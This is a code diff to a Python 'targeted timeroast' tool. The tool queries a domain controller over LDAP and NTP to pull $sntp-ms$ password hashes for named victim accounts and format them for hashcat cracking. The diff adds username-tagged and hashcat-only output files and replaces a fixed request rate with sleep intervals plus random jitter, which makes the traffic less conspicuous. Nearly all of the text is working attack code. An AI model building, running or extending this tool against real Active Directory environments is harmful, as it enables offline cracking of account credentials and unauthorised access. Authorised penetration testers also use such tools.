@@ -12,6 +12,7 @@ Python implementation with NTLM hash support.
 """
 
 import argparse
+import random
 import socket
 import struct
 import sys
@@ -199,8 +200,8 @@ class TargetedTimeroast:
             except:
                 pass
 
-    def extract_hash(self, response: bytes, rid: int) -> str:
-        """Extract hash from NTP response and format for hashcat"""
+    def extract_hash(self, response: bytes, rid: int, username: str, hashcat_format: bool = False) -> str:
+        """Extract hash from NTP response and format for output"""
         if len(response) != 68:
             return None
 
@@ -210,10 +211,14 @@ class TargetedTimeroast:
         hex_salt = salt.hex()
         hex_md5_hash = md5_hash.hex()
 
-        return f"{rid}:$sntp-ms${hex_md5_hash}${hex_salt}"
+        if hashcat_format:
+            return f"$sntp-ms${hex_md5_hash}${hex_salt}"
+        else:
+            return f"{username}:$sntp-ms${hex_md5_hash}${hex_salt}"
 
     def process_target(self, target: str, quiet: bool = False,
-                      verbose: bool = False, source_port: Optional[int] = None) -> Optional[str]:
+                      verbose: bool = False, source_port: Optional[int] = None,
+                      hashcat_format: bool = False) -> Optional[str]:
         """Process a single target user"""
         if verbose:
             print(f"[*] Processing target: {target}")
@@ -256,7 +261,7 @@ class TargetedTimeroast:
             if response:
                 if verbose:
                     print("[*] Received hash response!")
-                return self.extract_hash(response, rid)
+                return self.extract_hash(response, rid, target, hashcat_format)
             else:
                 print(f"[!] No proper reply received for RID {rid}")
                 return None
@@ -287,34 +292,57 @@ class TargetedTimeroast:
                         print("[!] Please enter 'y' or 'n'")
 
     def run(self, targets: List[str], output_file: Optional[str] = None,
-            rate: int = 180, timeout: int = 24, source_port: Optional[int] = None,
-            quiet: bool = False, verbose: bool = False) -> None:
+            hashcat_file: Optional[str] = None, sleep_time: float = 0.006, jitter: int = 0,
+            timeout: int = 24, source_port: Optional[int] = None, quiet: bool = False, verbose: bool = False) -> None:
         """Run the targeted timeroast attack"""
         if not self.connect():
             return
 
-        request_interval = 1.0 / rate
         hashes = []
 
         try:
             for target in targets:
-                start_time = time.time()
 
-                hash_result = self.process_target(target, quiet, verbose, source_port)
+                # Get both username and hashcat format hashes
+                username_hash = self.process_target(target, quiet, verbose, source_port, False)
+                hashcat_hash = None
 
-                if hash_result:
-                    hashes.append(hash_result)
+                if username_hash:
+                    hashes.append(username_hash)
 
+                    # Extract hashcat format if needed
+                    if hashcat_file:
+                        # Convert username:hash to pure hashcat format
+                        hashcat_hash = username_hash.split(':', 1)[1] if ':' in username_hash else username_hash
+
+                    # Save username format to output file
                     if output_file:
                         with open(output_file, 'a') as f:
-                            f.write(hash_result + '\n')
-                    else:
-                        print(hash_result)
+                            f.write(username_hash + '\n')
 
-                # Rate limiting
-                elapsed = time.time() - start_time
-                if elapsed < request_interval:
-                    time.sleep(request_interval - elapsed)
+                    # Save hashcat format to hashcat file
+                    if hashcat_file and hashcat_hash:
+                        with open(hashcat_file, 'a') as f:
+                            f.write(hashcat_hash + '\n')
+
+                    # Console output (always username format)
+                    if not output_file and not hashcat_file:
+                        print(username_hash)
+
+                # Sleep with optional jitter between requests
+                if sleep_time > 0:
+                    actual_sleep = sleep_time
+                    if jitter > 0:
+                        # Calculate jitter range (±jitter% of sleep_time)
+                        jitter_amount = sleep_time * (jitter / 100.0)
+                        min_sleep = max(0, sleep_time - jitter_amount)
+                        max_sleep = sleep_time + jitter_amount
+                        actual_sleep = random.uniform(min_sleep, max_sleep)
+
+                        if verbose:
+                            print(f"[*] Sleeping for {actual_sleep:.3f} seconds (base: {sleep_time}, jitter: ±{jitter}%)")
+
+                    time.sleep(actual_sleep)
 
         finally:
             if self.connection:
@@ -342,8 +370,10 @@ def main():
     target_group.add_argument('--victim', help='Single target username')
     target_group.add_argument('--file', help='File containing target usernames (one per line)')
 
-    parser.add_argument('-o', '--output', help='Output file for hashes')
-    parser.add_argument('--rate', type=int, default=180, help='Requests per second (default: 180)')
+    parser.add_argument('-o', '--output', help='Output file for hashes in username:hash format')
+    parser.add_argument('--hashcat', help='Output file for pure hashcat format (removes username prefix)')
+    parser.add_argument('--sleep', type=float, default=0.006, help='Seconds to sleep between requests (default: 0.006, supports decimals)')
+    parser.add_argument('--jitter', type=int, default=0, help='Jitter percentage for sleep timing (default: 0, range: 0-100)')
     parser.add_argument('--timeout', type=int, default=24, help='Timeout in seconds (default: 24)')
     parser.add_argument('--source-port', type=int, help='Source port for NTP requests')
     parser.add_argument('--ssl', action='store_true', help='Use SSL for LDAP connection')
@@ -392,8 +422,8 @@ def main():
         use_ssl=args.ssl, port=port
     )
 
-    timeroast.run(targets, args.output, args.rate, args.timeout,
-                  args.source_port, args.quiet, args.verbose)
+    timeroast.run(targets, args.output, args.hashcat, args.sleep, args.jitter,
+                  args.timeout, args.source_port, args.quiet, args.verbose)
 
 
 if __name__ == "__main__":
